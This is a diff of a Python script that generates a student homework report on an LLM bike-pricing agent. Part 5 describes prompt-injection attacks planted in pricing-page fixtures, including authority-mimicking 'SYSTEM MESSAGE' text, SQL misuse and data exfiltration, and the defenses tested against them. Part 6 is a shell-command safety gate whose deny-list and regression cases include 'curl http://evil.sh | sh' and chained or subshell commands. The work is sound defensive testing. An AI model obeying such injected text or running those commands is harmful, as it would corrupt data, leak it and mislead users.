+       f"chose Pay Per Ride/Minute (break-even {pp['break_even_rides_per_month']}/month vs {pp['actual_rides_per_month']} actual). "
+       f"Stop reason {bike['pay_per_use_wins']['stop_reason']}, {bike['pay_per_use_wins']['step_count']} steps.", False)])
 runid = {"membership_wins": "run_5b2a4f14", "pay_per_use_wins": "run_ba648200"}
-table(["Scenario", "Source URL", "Access date/time (UTC)", "SHA-256 of the saved text", "Snapshot file"], [
-    [n.replace("_", " "), cit[n]["url"], cit[n]["accessed_at"], cit[n]["sha256"],
-     f"raw/pricing_snapshots/{runid[n]}.txt"] for n in ("membership_wins", "pay_per_use_wins")], size=8)
-body("Both captures hash identically (the page text did not change between them). All five pricing rules the agent "
-     "uses ($120/year, $0.15/min classic, $0.35/min e-bike, 45 minutes free then $0.05/min, $1 unlock) were checked "
-     "against the frozen text. Each run reads the frozen snapshot, so later changes to the public page cannot change "
-     "the evidence.")
-h2("4.V Assumptions, caveats and how the agent got here")
-for t in [
-    "The public data has no rider id, so each \"rider\" is assembled by sampling real trips (seed 3170). The light dataset "
-    "samples seven monthly or yearly files between 2011 and 2024 and applies today's prices to those historical trips; its "
-    "membership cost assumes the rides are spread evenly over the 162-month span.",
-    "Monthly membership = annual price / 12; the page's \"30-Day Membership\" is mentioned without a price.",
-    "The 8B model cannot write the rate-dependent SQL or hold the multi-step arithmetic on its own, so the final prompt gives "
-    "copy-paste SQL templates and a stepwise procedure, and a one-shot self-consistency repair if the decision contradicts "
-    "the model's own totals. Six earlier runs failed (an invented $300 price, unfilled placeholders, a decision contradicting "
-    "its totals, a wrong membership total); they are kept in raw/dev_history/. qwen3 thinking mode was tried and abandoned "
-    "(one tool call in 30 minutes on this CPU).",
-]:
-    bullet(t)
+table(["Scenario", "Source URL", "Accessed (UTC)", "SHA-256", "Saved text"], [
+    [n.replace("_", " "), cit[n]["url"], cit[n]["accessed_at"], cit[n]["sha256"], f"raw/pricing_snapshots/{runid[n]}.txt"]
+    for n in ("membership_wins", "pay_per_use_wins")], size=8)
+body("Caveats: the light dataset applies today's prices to 2011–2024 trips and assumes the rides are spread evenly over "
+     "its span; the page mentions a \"30-Day Membership\" without a price.", italic=True)
 
 # ============================================================================================
 # Part 5
 # ============================================================================================
 h1("Part 5 — Prompt Injection and Tool Security")
-h2("5.I Threat model (attacker controls only the pricing page text)")
-table(["#", "Attacker goal", "Implementation condition that lets it succeed"], [
-    ["1", "Recommendation override: make the agent say \"Pay Per Ride/Minute\" although the rider's trips make membership "
-          "far cheaper.", "The model gives retrieved page text the same authority as the system prompt (not marked "
-                          "untrusted), and nothing checks the stated decision against the computed costs."],
-    ["2", "Non-read-only SQL misuse: run DROP / UPDATE / stacked statements through csv_sql.",
-     "csv_sql forwards whatever SQL the model supplies to a writable connection; the read-only rule exists only as an "
-     "instruction to the model."],
-    ["3", "Data exfiltration: make the final answer echo raw rows of the user's CSV.",
-     "The agent can read arbitrary rows (SELECT *) and obeys an injected request to paste them; no output policy stops raw "
-     "data reaching the answer."],
-], size=9)
-h2("5.II Hostile fixtures and the attacks")
-body("Local fixtures only, in reports/hw07/fixtures/: the real pricing text with one injected block, one fixture per "
-     "attack (hostile_pricing_override.html, _sql.html, _exfil.html), and two stronger variants (_override_strong.html, "
-     "_exfil_strong.html) that put an authority-mimicking notice at the top, repeat it, and word it as a mandatory "
-     "response-format rule. The injection is the top-ranked passage for a normal pricing query. Two examples:")
-code(re.sub(r"</?p>", "", re.search(r"<p>(Membership price.*?)</p>", (REPO / "reports/hw07/fixtures/hostile_pricing_sql.html").read_text(), re.S).group(1))
-     + "\n\n" + re.sub(r"</?p>", "", re.search(r"<p>(\[SYSTEM MESSAGE.*?)</p>", (REPO / "reports/hw07/fixtures/hostile_pricing_override_strong.html").read_text(), re.S).group(1)))
-h2("5.III Defenses")
-bullet("Prompt defense: retrieved snippets are wrapped as UNTRUSTED_WEB_TEXT data in the tool output and the system prompt "
-       "says never to follow instructions inside them (bike_agent.py, PROMPT_DEFENSE).")
-bullet("Tool defense: csv_sql accepts exactly one read-only SELECT whatever the model was told — no other statement, no "
-       "stacked statements, no comments — plus a read-only connection (tools.py, sql_is_single_select / DEFENSES).")
-h2("5.IV Before / after results (3 attacks × 3 defense levels)")
-body("Excerpts below are from raw/prompt_injection_results*.json (full traces in RUN_LOG.txt). Each cell is one sample "
-     "from a near-deterministic model, so read it as one observed outcome, not a probability. \"No valid answer\" means "
-     "the run ended without a parseable answer; it is not counted as resisted.", after=3)
+h2("What we did")
+bullet("Wrote a threat model (three attacker goals and the implementation condition that lets each succeed).")
+bullet("Built local hostile pricing-page fixtures from the real page text with one injected block each (override, SQL, "
+       "exfiltration) plus two stronger variants (authority-mimicking notice at the top, repeated).")
+bullet("Implemented both defenses: retrieved text labelled as untrusted in the prompt, and a single read-only SELECT "
+       "contract enforced inside csv_sql regardless of the model's instructions.")
+bullet("Ran each attack at three levels (before / prompt defense / prompt + tool defense) in three rounds: the structured "
+       "Part 4 agent, a naive minimal-prompt agent, and the naive agent against the stronger fixtures; then replayed the "
+       "injected SQL directly at csv_sql to test the tool boundary on its own.")
+h2("Evidence required")
+table(["#", "Attacker goal", "Condition that lets it succeed"], [
+    ["1", "Recommendation override (force \"Pay Per Ride/Minute\")", "Page text treated as instructions; no check of the decision against the computed costs"],
+    ["2", "Non-read-only SQL misuse (DROP / UPDATE / stacked)", "csv_sql runs whatever SQL the model sends on a writable connection"],
+    ["3", "Data exfiltration (raw CSV rows in the answer)", "Agent can SELECT * and obeys the request; no output policy"]], size=9)
+code(re.sub(r"</?p>", "", re.search(r"<p>(\[SYSTEM MESSAGE.*?)</p>", (REPO / "reports/hw07/fixtures/hostile_pricing_override_strong.html").read_text(), re.S).group(1)),
+     size=7)
+body("Fixtures saved in reports/hw07/fixtures/. Before/after results (one sample per cell; excerpts from "
+     "raw/prompt_injection_results*.json, full traces in RUN_LOG.txt; \"no valid answer\" = the run ended without a "
+     "parseable answer, not counted as resisted):", after=2)
 
 
 def cell_text(attack, c):
     base = attack.split("_")[0]
-    head = ("ATTACK SUCCEEDED" if c["attack_succeeded"] else "resisted" if c["stop_reason"] == "completed"
-            else "no valid answer")
+    head = ("ATTACK SUCCEEDED" if c["attack_succeeded"] else "resisted" if c["stop_reason"] == "completed" else "no valid answer")
     if base == "override":
         ex = f"decision = {c['decision']!r}"
     elif base == "sql":
@@ -525,81 +426,61 @@ def cell_text(attack, c):
     return f"{head}. {ex}"
 
 
+names = {"override": "Recommendation override", "sql": "Non-SELECT tool misuse", "exfil": "Data exfiltration"}
 for title, res in inj.items():
     if not res:
         continue
     body(title, bold=True, after=1)
-    attacks = {a.split("/")[0] for a in res}
-    names = {"override": "Recommendation override", "sql": "Non-SELECT tool misuse", "exfil": "Data exfiltration"}
     rows = []
-    for a in sorted(attacks, key=lambda k: ["override", "sql", "exfil"].index(k.split("_")[0])):
+    for a in sorted({k.split("/")[0] for k in res}, key=lambda k: ["override", "sql", "exfil"].index(k.split("_")[0])):
         rows.append([names[a.split("_")[0]]] + [cell_text(a, res[f"{a}/{d}"]) if f"{a}/{d}" in res else "—"
                                                  for d in ("before", "prompt", "prompt+tool")])
-    table(["Attack", "Before defenses", "After prompt defense", "After prompt + tool defense"], rows, size=8,
-          widths=[1.1, 1.9, 1.9, 1.9])
+    table(["Attack", "Before defenses", "After prompt defense", "After prompt + tool defense"], rows, size=8, widths=[1.1, 1.9, 1.9, 1.9])
 allc = [c for r in inj.values() if r for c in r.values()]
-body(f"Overall: {sum(c['attack_succeeded'] for c in allc)} of {len(allc)} live attack runs succeeded: the naive agent ran "
-     "injected SQL with no defenses (4 non-SELECT statements issued, 1 executed), and the stronger override fixture "
-     "succeeded after the prompt defense and after prompt + tool defense while being resisted with no defenses. Exfiltration "
-     "never worked (0 of 9), and the structured Part 4 prompt resisted everything — probably because its numbered procedure "
-     "leaves no opening, which Round 2 tests with a minimal prompt. The override result shows the prompt label does not "
-     "reliably protect; with one sample per cell it does not show the label made things worse.")
-body("Because the defended SQL runs never tried the injected SQL, the tool boundary was also replayed directly: the "
-     "statements a fooled model would send, aimed at csv_sql with the contract off and then on (scripted, no model):", after=2)
-rp_rows = []
-for a, b in zip(replay["guard_off"], replay["guard_on"], strict=True):
-    rp_rows.append([clip(a["sql"], 48), f"{a['tool_success']} / {a['data_changed']}", f"{b['tool_success']} / {b['data_changed']}"])
-table(["Statement", "Guard off: ran / data changed", "Guard on: ran / data changed"], rp_rows, size=8)
-body("With the contract off, 6 of 7 hostile statements changed the data; with it on all 7 were refused, no data changed, "
-     "and the legitimate SELECT still ran.")
-shot("5.1 (optional): terminal — an attack run or the tool-boundary replay (python code/hw07/bike/part5_attacks.py replay)")
-h2("5.V Why tool-boundary enforcement differs from a prompt-only defense")
-body("A prompt defense is a request to the model. It works only if the model complies, it can be undone by better-worded "
-     "text, and nothing verifies the outcome — Round 3 is a live example, where the label did not stop the override. A "
-     "tool-boundary check is code that runs on every call whatever the model was told or believes: a fooled, jailbroken or "
-     "simply wrong model still cannot make csv_sql run anything but a single SELECT. It is deterministic, testable without a "
-     "model, and fails closed. It only covers what the tool can see: it cannot stop a wrong recommendation or data "
-     "paraphrased into the answer, which is why override and exfiltration need output checks (for example recomputing the "
-     "cost and comparing it with the stated decision) and are not solved by the SELECT contract.")
+off = sum(r["data_changed"] for r in replay["guard_off"])
+on = sum(r["data_changed"] for r in replay["guard_on"])
+body(f"Overall {sum(c['attack_succeeded'] for c in allc)} of {len(allc)} live attack runs succeeded: the naive agent ran injected "
+     "SQL with no defenses, and the stronger override fixture succeeded after the prompt defense and after prompt + tool "
+     "defense (resisted with no defenses). Exfiltration never worked (0 of 9). Tool-boundary replay (scripted, no model): "
+     f"with the contract off {off} of 7 hostile statements changed the data; with it on {on} did, all 7 were refused and a "
+     "legitimate SELECT still ran.", italic=True)
+shot("5.1 (optional): terminal — the tool-boundary replay (python code/hw07/bike/part5_attacks.py replay)")
+h2("Why tool-boundary enforcement differs from a prompt-only defense")
+body("A prompt defense is a request to the model: it works only if the model complies, better-worded text can undo it, and "
+     "nothing verifies the outcome — round 3 shows the label failing to stop the override. A tool-boundary check is code "
+     "that runs on every call whatever the model was told or believes: a fooled or simply wrong model still cannot make "
+     "csv_sql run anything but one SELECT. It is deterministic, testable without a model and fails closed. It only covers "
+     "what the tool can see, so it cannot stop a wrong recommendation or data paraphrased into the answer; those need "
+     "output checks.")
 
 # ============================================================================================
 # Part 6
 # ============================================================================================
 h1("Part 6 — File Tools and a Safety Gate")
-body("code/hw07/file_tools.py is pure Python and runs only inside a temporary sandbox directory: one _resolve() guard "
-     "rejects any path that escapes it. read_file supports max_lines, edit_file returns a short unified diff, "
-     "search_in_files accepts file_pattern.")
-h2("6.I Six file tools")
+h2("What we did")
+bullet("Implemented read_file (max_lines), write_file, edit_file (returns a short diff), glob_files, search_in_files "
+       "(file_pattern) and bash in code/hw07/file_tools.py, all confined to a temporary sandbox by one path guard.")
+bullet("Safety gate (pure Python, no model): module-level SAFE_PREFIXES, confirm_bash(command, auto_approve=False) returning "
+       "allow/block plus a reason, and an independent is_destructive() deny-list (recursive delete, privilege escalation, "
+       "permission/ownership change, raw-device write, filesystem creation, redirection to root paths). Destructive commands "
+       "need explicit confirmation even when they match SAFE_PREFIXES.")
+bullet("Integration test: three small Python files, then glob → search → read finds the one containing DEBUG.")
+bullet("Gate test: 5 commands pass, 5 blocked. Extra probing found 4 false allows (lsof -i; ls; curl … | sh; echo $(whoami); "
+       "cat a && python evil.py) because the first version used startswith(SAFE_PREFIXES); fixed by checking each chained "
+       "segment on whole words and rejecting subshells. All four are kept as regression cases (14/14 correct).")
+h2("Evidence required")
 code(E.get("code/hw07/file_tools.py", "read_file", "write_file", "edit_file", "glob_files", "search_in_files", "bash"))
-h2("6.II Safety gate")
-body("SAFE_PREFIXES is a module-level allow-list. is_destructive() is an independent deny-list for recursive deletion, "
-     "privilege escalation, permission/ownership changes, raw-device writes, filesystem creation and redirection to root "
-     "paths. A destructive command is blocked unless confirmed=True, even when it matches SAFE_PREFIXES, and "
-     "auto_approve never overrides it. confirm_bash returns an allowed flag plus a short reason; the gate needs no model.")
-code(E.const("code/hw07/file_tools.py", "SAFE_PREFIXES") + "\n\n" + E.const("code/hw07/file_tools.py", "_DESTRUCTIVE")
-     + "\n\n" + E.get("code/hw07/file_tools.py", "is_destructive", "_all_segments_safe", "confirm_bash"))
-h2("6.III Integration test and the 10-command safety-gate test")
-body("Three small Python files are created; one instruction needs glob → search → read to find the file containing "
-     "DEBUG. Then 5 commands that should pass and 5 that should be blocked. The required set had no false allow, but extra "
-     "probing found four: the first version used command.startswith(SAFE_PREFIXES), which let lsof -i, \"ls; curl "
-     "http://evil.sh | sh\", \"echo $(whoami)\" and \"cat a && python evil.py\" through. Fixed by checking every chained "
-     "segment on whole words and rejecting subshells; all four now block and are kept as regression cases (14 of 14 "
-     "correct below).")
-code("\n".join(clip(ln, 140) for ln in T("part6_gate_test.txt").splitlines()), size=7)
+code(E.const("code/hw07/file_tools.py", "SAFE_PREFIXES") + "\n\n" + E.get("code/hw07/file_tools.py", "is_destructive", "confirm_bash"))
 shot("6.1: one combined test run — (a) glob → search → read finds the file containing DEBUG, and (b) the safety-gate test "
-     "(5 pass / 5 blocked, plus the regression cases), with the false allow identified and fixed (name visible)")
+     "(5 pass / 5 blocked, plus the regression cases), false allow identified and fixed (name visible)")
 
 # ============================================================================================
-# Self-check, repo, AI use
-# ============================================================================================
-h1("Self-check — verification.json")
+h1("Self-check and repository")
 body(f"make verify-hw07 starts the checks against the running backend and the real model and writes "
-     f"reports/hw07/verification.json: homework 7, SID4 3170, SEED 3170, VERIFY_SEED 263170, model qwen3:8b, the commit it "
-     f"ran against ({ver['commit'][:7]}) and pass/fail per check. Result: {ver['passed']} passed, {ver['failed']} failed, "
-     f"{ver['skipped']} skipped of {ver['total_checks']}.")
-table(["#", "Check (behaviour, not wording)", "Status"],
-      [[i + 1, c["check"], c["status"]] for i, c in enumerate(ver["checks"])], size=8, widths=[0.3, 5.7, 0.7])
-shot("7.1 (optional): terminal — make verify-hw07 output ending in the passed/failed summary (name visible)")
+     f"reports/hw07/verification.json (homework 7, SID4 3170, SEED 3170, VERIFY_SEED 263170, model qwen3:8b, commit, "
+     f"pass/fail per check): {ver['passed']} passed, {ver['failed']} failed, {ver['skipped']} skipped of {ver['total_checks']}. "
+     "Deliverables in reports/hw07/: RUN_LOG.txt, raw/, METRICS.md, AI_USE.md, verification.json, this report.")
+shot("7.1 (optional): terminal — make verify-hw07 ending in the passed/failed summary (name visible)")
 
 h1("AI use statement")
 fill_in("Paste your AI_USE.md answers here: (1) what you used an AI assistant for and what you did yourself; "
@@ -607,9 +488,8 @@ fill_in("Paste your AI_USE.md answers here: (1) what you used an AI assistant fo
         "(3) how you detected the problem or verified the result; (4) what you changed and why it works now.")
 
 h1("References")
-for ref_ in ["Capital Bikeshare — pricing page: https://capitalbikeshare.com/pricing (captured text and SHA-256 in raw/pricing_snapshots/).",
-             "Capital Bikeshare — system data: https://s3.amazonaws.com/capitalbikeshare-data/ (monthly and yearly trip files).",
-             "Repository: https://github.com/pragnayap/data260-3170 — code/hw07/, code/web_application/jwt_auth.py, reports/hw07/."]:
+for ref_ in ["Capital Bikeshare — pricing: https://capitalbikeshare.com/pricing (captured text and SHA-256 in raw/pricing_snapshots/).",
+             "Capital Bikeshare — system data: https://s3.amazonaws.com/capitalbikeshare-data/."]:
     bullet(ref_)
 
 doc.save(OUT)
